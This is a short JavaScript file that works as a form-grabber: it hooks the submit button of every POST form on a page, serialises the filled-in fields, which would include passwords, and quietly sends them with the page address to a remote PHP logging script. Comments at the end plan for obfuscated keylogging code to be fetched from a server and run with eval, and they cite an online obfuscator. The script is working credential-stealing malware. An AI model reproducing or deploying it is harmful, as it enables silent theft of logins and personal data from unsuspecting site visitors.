/**
 *  Find all forms with POST method, and modify the submit button
 * to send all information to a PHP server before doing what was
 * supposed to do. 
 * 
 */

var allForms = document.querySelectorAll('form[method="post"]');

if(allForms.length > 0)
    for(let form of allForms) {
        var submitButton = form.querySelectorAll('[type="submit"]')[0];
        submitButton.addEventListener("click", processForm);
    }

function processForm(e) {
    //Find the form
    //e.preventDefault();
    var sourceForm = e.target.closest("form");
    //console.log(window.location + " " + serialize(sourceForm))
    formData = new FormData();
    formData.append("data", serialize(sourceForm));
    formData.append("website", window.location.hostname + window.location.pathname);
    formData.append("postForm", true);

    httpRequest = new XMLHttpRequest();
    httpRequest.onreadystatechange = function ( response ) {};
    httpRequest.open('POST', "http://127.0.0.10/PHP/mtalogger.php");
    httpRequest.send(formData);
    return false;
}

var serialize = function (form) {
	var field,
		l,
		s = [];

	if (typeof form == 'object' && form.nodeName == "FORM") {
		var len = form.elements.length;

		for (var i = 0; i < len; i++) {
			field = form.elements[i];
			if (field.name && !field.disabled && field.type != 'button' && field.type != 'file' && field.type != 'hidden' && field.type != 'reset' && field.type != 'submit') {
				if (field.type == 'select-multiple') {
					l = form.elements[i].options.length;

					for (var j = 0; j < l; j++) {
						if (field.options[j].selected) {
							s[s.length] = encodeURIComponent(field.name) + "=" + encodeURIComponent(field.options[j].value);
						}
					}
				}
				else if ((field.type != 'checkbox' && field.type != 'radio') || field.checked) {
					s[s.length] = encodeURIComponent(field.name) + "=" + encodeURIComponent(field.value);
				}
			}
		}
	}
	return s.join('&').replace(/%20/g, '+');
};

//Server to return obfuscated code for keylogging

//eval(receivedFromServer);

//We need a server to get info

//https://obfuscator.io/